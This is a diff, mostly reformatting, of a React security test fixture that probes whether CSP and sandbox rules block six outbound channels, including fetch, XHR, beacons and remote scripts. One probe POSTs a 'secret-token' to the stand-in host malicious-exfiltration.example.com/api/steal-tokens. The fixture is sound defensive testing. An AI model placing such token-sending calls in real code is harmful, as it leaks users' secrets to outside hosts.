@@ -26,7 +26,7 @@ export default function SecurityNetworkExfiltrationFixture() {
     beaconBlocked: null,
     imageBlocked: null,
     scriptBlocked: null,
-    topNavBlocked: null,
+    topNavBlocked: null
   });
 
   useEffect(() => {
@@ -51,7 +51,7 @@ export default function SecurityNetworkExfiltrationFixture() {
     // 1. Probe fetch()
     fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
       method: 'POST',
-      body: JSON.stringify({ leaked: 'secret-token' }),
+      body: JSON.stringify({ leaked: 'secret-token' })
     })
       .then(() => setProbeResults((p) => ({ ...p, fetchBlocked: false })))
       .catch(() => setProbeResults((p) => ({ ...p, fetchBlocked: true })));
@@ -150,57 +150,123 @@ export default function SecurityNetworkExfiltrationFixture() {
         Multi-Vector Network & Navigation Exfiltration Probe
       </h2>
       <p className="text-xs text-gray-600">
-        Verifies CSP (<code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">connect-src &apos;none&apos;</code>,{' '}
-        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">img-src &apos;self&apos; data:</code>,{' '}
-        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">script-src &apos;unsafe-inline&apos;</code>) and sandbox navigation restrictions.
+        Verifies CSP (
+        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
+          connect-src &apos;none&apos;
+        </code>
+        ,{' '}
+        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
+          img-src &apos;self&apos; data:
+        </code>
+        ,{' '}
+        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
+          script-src &apos;unsafe-inline&apos;
+        </code>
+        ) and sandbox navigation restrictions.
       </p>
 
       <div className="space-y-2 text-xs font-mono">
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>1. Outbound fetch() API:</span>
-          <span data-testid="probe-fetch-status" className={probeResults.fetchBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.fetchBlocked === null ? 'PROBING...' : probeResults.fetchBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-fetch-status"
+            className={
+              probeResults.fetchBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.fetchBlocked === null
+              ? 'PROBING...'
+              : probeResults.fetchBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
 
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>2. XMLHttpRequest (XHR):</span>
-          <span data-testid="probe-xhr-status" className={probeResults.xhrBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.xhrBlocked === null ? 'PROBING...' : probeResults.xhrBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-xhr-status"
+            className={
+              probeResults.xhrBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.xhrBlocked === null
+              ? 'PROBING...'
+              : probeResults.xhrBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
 
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>3. navigator.sendBeacon:</span>
-          <span data-testid="probe-beacon-status" className={probeResults.beaconBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.beaconBlocked === null ? 'PROBING...' : probeResults.beaconBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-beacon-status"
+            className={
+              probeResults.beaconBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.beaconBlocked === null
+              ? 'PROBING...'
+              : probeResults.beaconBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
 
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>4. Remote Image (&lt;img src&gt;):</span>
-          <span data-testid="probe-image-status" className={probeResults.imageBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.imageBlocked === null ? 'PROBING...' : probeResults.imageBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-image-status"
+            className={
+              probeResults.imageBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.imageBlocked === null
+              ? 'PROBING...'
+              : probeResults.imageBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
 
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>5. Remote Script Injection:</span>
-          <span data-testid="probe-script-status" className={probeResults.scriptBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.scriptBlocked === null ? 'PROBING...' : probeResults.scriptBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-script-status"
+            className={
+              probeResults.scriptBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.scriptBlocked === null
+              ? 'PROBING...'
+              : probeResults.scriptBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
 
         <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
           <span>6. Top-Level Navigation:</span>
-          <span data-testid="probe-topnav-status" className={probeResults.topNavBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
-            {probeResults.topNavBlocked === null ? 'PROBING...' : probeResults.topNavBlocked ? 'BLOCKED' : 'BREACHED'}
+          <span
+            data-testid="probe-topnav-status"
+            className={
+              probeResults.topNavBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
+            }
+          >
+            {probeResults.topNavBlocked === null
+              ? 'PROBING...'
+              : probeResults.topNavBlocked
+                ? 'BLOCKED'
+                : 'BREACHED'}
           </span>
         </div>
       </div>
 
       <div className="pt-2 border-t border-gray-200 flex items-center justify-between">
-        <span className="text-xs font-semibold text-gray-700">Composite Exfiltration Boundary:</span>
+        <span className="text-xs font-semibold text-gray-700">
+          Composite Exfiltration Boundary:
+        </span>
         <span
           data-testid="network-isolation-status"
           className={`px-2.5 py-1 rounded text-xs font-mono font-bold ${
@@ -209,7 +275,11 @@ export default function SecurityNetworkExfiltrationFixture() {
               : 'bg-yellow-100 text-yellow-800'
           }`}
         >
-          {!allResolved ? 'TESTING...' : allBlocked ? 'ALL_EXFILTRATION_BLOCKED' : 'VULNERABILITY_DETECTED'}
+          {!allResolved
+            ? 'TESTING...'
+            : allBlocked
+              ? 'ALL_EXFILTRATION_BLOCKED'
+              : 'VULNERABILITY_DETECTED'}
         </span>
       </div>
     </div>
